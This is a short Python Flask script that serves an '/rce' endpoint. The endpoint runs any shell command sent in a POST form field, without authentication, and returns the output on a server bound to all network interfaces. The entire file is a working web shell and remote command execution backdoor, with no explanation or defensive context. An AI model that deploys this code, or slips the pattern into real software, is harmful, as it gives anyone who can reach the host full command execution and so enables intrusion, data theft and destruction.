#!/usr/bin/python3
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/rce', methods=['POST'])
def hello_world():
    cmd = request.form["cmd"]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
    (output, err) = p.communicate()
    return(output)


if __name__ == '__main__':
    app.run(port=5000, host="0.0.0.0")
